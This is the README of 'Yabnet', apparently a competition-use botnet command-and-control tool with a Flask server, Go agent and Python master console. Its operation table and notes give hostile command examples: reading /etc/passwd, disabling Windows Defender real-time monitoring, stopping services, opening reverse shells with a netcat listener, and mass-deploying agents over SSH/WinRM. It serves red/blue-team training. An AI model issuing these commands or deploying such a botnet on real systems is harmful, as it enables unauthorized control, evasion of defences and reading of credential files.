# Yabnet
Yet Another Botnet, PoC created for educational purposes only.
Yabnet is a HTTP based C2 server and agent that was designed, created, and intended to be used in an academic Attack/Defense competition environment. 

Yabnet server is written in Python3 Flask and is deployed in docker/docker-compose. Yabnet agent is written in Golang. Yabnet's master console is written in Python3. 

From setting up the server, compiling the agent, and distributing the agent to the target machine, yabnet aims to work out-of-the-box. That way, the red teamers could focus on more important stuffs, such as persistence. 

## Dear Blueteamers

Yeah, you, who is stalking red teamers' repos (you should btw. Go make a script). I make all of my tools public because I believe that blue teamers learning is more important than my implants getting caught during competitions. As long as you are learning how to detect my tools, prevent them, and delete them, I'll be very happy. Please focus on learning, rather than winning competitions! (ofc win them as well) 

## Disclaimer
Yabnet is a proof of concept tool which was only created for educational purposes in classroom and cybersecurity related competitions. This tool is not created, nor is good enough for any real world usage. I do not condone use of this tool anything other than educational purposes. Using any of the files of yabnet in/against a system that you do not own is illegal, and you will get caught.

-----------

## Under Construction - TODO 

**Yabnet is currently in PoC version.**
- [x] Dockerize server 
- [x] Create agent in `golang`, instead of using python 
- [x] Support windows for agent 
- [x] Clean up debugging codes in all files 
- [x] Enhance golang agent & generation of golang 
- [x] Enhance README documentation and usage
- [x] Add upload feature from master to server 
- [x] Finalize and structure all in-code comments  
- [x] Support communicating with PWNBOARD 

- [x] Stop using sqlite3 because database locking
-----------

## Installation 

**Yabnet requires python3, GOLANG, docker, and docker-compose**

**Due to laziness, yabnet currently requires to be installed in the /opt directory.**

### Server configuration & setup
```

EDIT /yabnet/server/config.py first 

cd /yabnet/server
docker-compose build && docker-compose up 
```

### Master setup

Use the credential that was configured in `/yabnet/server/config.py` file.

```
cd /yabnet/master
pip3 install -r requirements.txt 

python3 master.py
Yabnet>> login -r localhost -u <user> -p <password>
``` 


### Agent setup - Golang 

**Generating Agent through master console**
```
Yabnet>> generate -i <serverip> -p <serverport>  // for linux 
Yabnet>> generate -i <serverip> -p <serverport> -w   // -w is for Windows
```


## Components 

**Server and Agent**

Server = Python flask application inside Docker container 

Agent = Golang based static executable 

Master = Python console application for interacting with the server 

**Utility scripts - WIP** 

`/yabnet/utils/deployer.py` = Python script which helps to distribute and drops agent file to specific range of IP addresses via SSH and pyWinRM

`/yabnet/utils/gen_ip.py` = Python script which will generate text files containing ip address of all teams' windows/linux boxes 


## Operation 

The master console has various commands that can be used for controlling the bots. 

**All commands have `-h` help flag**

| Command | Description | Examples | 
| --- | --- | --- |
| login | Login to the server as a master | `login -r 10.0.0.1:443 -u admin -p password` | 
| generate | Compile and generate golang agent binary. Supports x64 of linux, windows | `generate -i 10.0.0.1 -p 443` | 
| list | List all currently registered bots | `list` |
| list [hostname] | List bots with privileged user with hostname across all teams | `list annebonny`
| push | Push a command to bot(s) | `push -t botid,botid -c "cat /etc/passwd"` | 
| upload | Upload local file to yabnet server's upload folder | `upload -f <local_file_location>` 
| download | Command a bot to download a file from the server | `download -t <botid> -f test.txt -d c:\users\administrator\a.txt` | 
| reverse | Command a bot to start a reverse shell back to server | `reverse -t <botid> -p <server_listening_port>` | 
| broadcast | Push a command to entire bots (Not Recommended) | `broadcast -c "systemctl stop ssh"` | 
| cleanup | Remove all staged commands for all bots | `cleanup` | 
| pwnboard | Start pwnboard auto-update thread | `pwnboard --start -u http://[server]:[port]/generic`
| help, ? | List all possible commands | `help` | 

**Notes** 
1. Specifying multiple targets with `,` comma separator is possible. 

`ex) push -t 1,2,3,4 -c "systemctl stop apache2"`

`ex) push -t 5,6,7 -c "powershell -c set-mppreference -disablerealtimemonitoring \$true"` 


2. Reverse shell command requires the master to open a new console and setup a netcat listener. 

`ex) reverse -t 11 -p 31337` 

`ex) nc -lvnp 31337         // And then wait for the reverse shell from 10.0.3.4` 

3. The server is hosting files in `<somewhere>/yabnet/server/uploads/` directory.

4. All commands have `-h` help flag available.

## Demo
<insert youtubelink here>

## Special Thanks 
[NotoriousRebel](https://github.com/NotoriousRebel) - "Every red teamer should create their own C2"
